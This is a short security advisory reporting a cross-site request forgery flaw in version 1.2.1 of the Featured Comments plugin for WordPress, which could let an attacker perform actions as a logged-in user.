Featured Comments plugin for WordPress is prone to a cross-site request-forgery vulnerability.

An attacker can exploit the cross-site request forgery issue to perform unauthorized actions in the context of a logged-in user of the affected application. This may aid in other attacks.

Featured Comments 1.2.1 is vulnerable; other versions may also be affected.
